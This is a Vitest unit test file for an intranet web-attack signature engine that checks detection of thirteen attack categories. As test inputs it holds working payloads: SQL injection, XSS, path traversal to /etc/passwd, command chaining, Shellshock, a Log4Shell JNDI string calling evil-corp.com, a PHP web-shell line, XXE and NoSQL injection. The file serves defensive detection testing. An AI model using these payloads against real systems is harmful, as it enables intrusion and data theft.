/**
 * VIGILANCE Nowhere Esports Intranet - Signature Engine Unit Tests
 * Tests all 14 configured attack categories, benign inputs, and ReDoS resilience.
 */

import { describe, it, expect } from 'vitest';
import { loadAndValidateRules } from '../../src/config/rules.js';
import { SignatureEngine } from '../../src/engine/signatureEngine.js';

describe('Signature Matching Engine', () => {
  const rulesConfig = loadAndValidateRules();
  const engine = new SignatureEngine(rulesConfig);

  it('successfully loads and compiles all 14 signature rules', () => {
    expect(rulesConfig.rules.length).toBeGreaterThanOrEqual(14);
  });

  // 1. SQL Injection (Basic & Advanced)
  describe('SQL Injection Signatures', () => {
    it('detects classic OR tautology', () => {
      const matches = engine.evaluate({
        path: '/api/v1/tournaments',
        query: { filter: "admin' OR '1'='1" },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'SQL_INJECTION')).toBe(true);
      expect(matches.some(m => m.rule_id === 'SIG-SQLI-001')).toBe(true);
    });

    it('detects UNION-based data exfiltration', () => {
      const matches = engine.evaluate({
        path: '/api/v1/players',
        query: { id: '1 UNION SELECT username, password FROM users--' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.rule_id === 'SIG-SQLI-002')).toBe(true);
    });

    it('ignores benign queries containing natural language words "or" and "and"', () => {
      const matches = engine.evaluate({
        path: '/tournaments',
        query: { search: 'rock and roll music' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'SQL_INJECTION')).toBe(false);
    });
  });

  // 2. Cross-Site Scripting (XSS)
  describe('Cross-Site Scripting (XSS)', () => {
    it('detects script tag injection in query string', () => {
      const matches = engine.evaluate({
        path: '/tournaments',
        query: { search: '<script>alert(document.cookie)</script>' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'CROSS_SITE_SCRIPTING')).toBe(true);
    });

    it('detects inline event handler execution (onerror, onload)', () => {
      const matches = engine.evaluate({
        path: '/profile',
        query: {},
        headers: {},
        body: { avatar: '<img src=x onerror=alert(1)>' },
      });
      expect(matches.some(m => m.category === 'CROSS_SITE_SCRIPTING')).toBe(true);
    });
  });

  // 3. Path Traversal
  describe('Path Traversal Signatures', () => {
    it('detects dot-dot-slash directory climbing', () => {
      const matches = engine.evaluate({
        path: '/download',
        query: { file: '../../../../etc/passwd' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'PATH_TRAVERSAL')).toBe(true);
    });

    it('detects URL-encoded path traversal (%2e%2e%2f)', () => {
      const matches = engine.evaluate({
        path: '/download',
        query: { file: '%2e%2e%2f%2e%2e%2fwindows/win.ini' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'PATH_TRAVERSAL')).toBe(true);
    });
  });

  // 4. Command Injection & Shellshock
  describe('Command Injection & Shellshock', () => {
    it('detects shell metacharacter command chaining', () => {
      const matches = engine.evaluate({
        path: '/api/v1/ping',
        query: { host: '127.0.0.1; cat /etc/passwd' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'COMMAND_INJECTION')).toBe(true);
    });

    it('detects GNU Bash Shellshock function definition in User-Agent header', () => {
      const matches = engine.evaluate({
        path: '/',
        query: {},
        headers: { 'user-agent': '() { :;}; /bin/bash -c "sleep 5"' },
        body: null,
      });
      expect(matches.some(m => m.rule_id === 'SIG-SHELLSHOCK-001')).toBe(true);
    });
  });

  // 5. Log4Shell
  describe('Log4Shell JNDI Injection', () => {
    it('detects standard jndi:ldap exploit strings in headers', () => {
      const matches = engine.evaluate({
        path: '/api/v1/staff',
        query: {},
        headers: { 'user-agent': '${jndi:ldap://evil-corp.com/payload}' },
        body: null,
      });
      expect(matches.some(m => m.category === 'LOG4SHELL')).toBe(true);
      expect(matches.some(m => m.rule_id === 'SIG-LOG4J-001')).toBe(true);
    });
  });

  // 6. Code Injection (PHP / Eval)
  describe('Code Injection', () => {
    it('detects PHP execution tags and system execution calls', () => {
      const matches = engine.evaluate({
        path: '/upload',
        query: {},
        headers: {},
        body: '<?php system($_GET["cmd"]); ?>',
      });
      expect(matches.some(m => m.category === 'CODE_INJECTION')).toBe(true);
    });
  });

  // 7. Sensitive File Discovery (Reconnaissance)
  describe('Reconnaissance & Canary Probing', () => {
    it('detects access to .env, .git, and config backups', () => {
      const matches = engine.evaluate({
        path: '/.env',
        query: {},
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'RECONNAISSANCE')).toBe(true);
    });
  });

  // 8. NoSQL Injection
  describe('NoSQL Injection', () => {
    it('detects MongoDB operator injection ($gt, $ne, $where)', () => {
      const matches = engine.evaluate({
        path: '/login',
        query: {},
        headers: {},
        body: '{"username": {"$gt": ""}, "password": {"$ne": ""}}',
      });
      expect(matches.some(m => m.category === 'NOSQL_INJECTION')).toBe(true);
    });
  });

  // 9. XXE Injection
  describe('XML External Entity (XXE)', () => {
    it('detects DOCTYPE and ENTITY declarations in XML payloads', () => {
      const matches = engine.evaluate({
        path: '/api/v1/import',
        query: {},
        headers: {},
        body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      });
      expect(matches.some(m => m.category === 'XXE_INJECTION')).toBe(true);
    });
  });

  // 10. Server-Side Template Injection (SSTI)
  describe('Server-Side Template Injection (SSTI)', () => {
    it('detects Jinja/Twig/Handlebars template execution delimiters', () => {
      const matches = engine.evaluate({
        path: '/search',
        query: { q: '{{7*7}} ${7*7}' },
        headers: {},
        body: null,
      });
      expect(matches.some(m => m.category === 'SSTI')).toBe(true);
    });
  });

  // 11. Scanner User-Agents
  describe('Automated Scanner Detection', () => {
    it('detects automated vulnerability tools in User-Agent header', () => {
      const matches = engine.evaluate({
        path: '/',
        query: {},
        headers: { 'user-agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)' },
        body: null,
      });
      expect(matches.some(m => m.category === 'SCANNER')).toBe(true);
    });
  });

  // 12. Credential Stuffing / Auth Bruteforce
  describe('Credential Stuffing Indicators', () => {
    it('detects high-risk administrative authorization payloads', () => {
      const matches = engine.evaluate({
        path: '/admin/login',
        query: {},
        headers: {},
        body: { username: 'root', action: 'dump_passwords' },
      });
      expect(matches.some(m => m.category === 'CREDENTIAL_STUFFING')).toBe(true);
    });
  });

  // 13. ReDoS Performance Resilience Test
  describe('Catastrophic Backtracking (ReDoS) Resilience', () => {
    it('processes a 10,000-character adversarial string in under 15ms', () => {
      // String with nested repeated patterns designed to trigger backtracking in naive regexes
      const maliciousPayload = 'a'.repeat(5000) + '!' + 'b'.repeat(5000);
      const startTime = performance.now();

      engine.evaluate({
        path: '/search',
        query: { q: maliciousPayload },
        headers: { 'user-agent': maliciousPayload },
        body: maliciousPayload,
      });

      const elapsedMs = performance.now() - startTime;
      expect(elapsedMs).toBeLessThan(15);
    });
  });
});
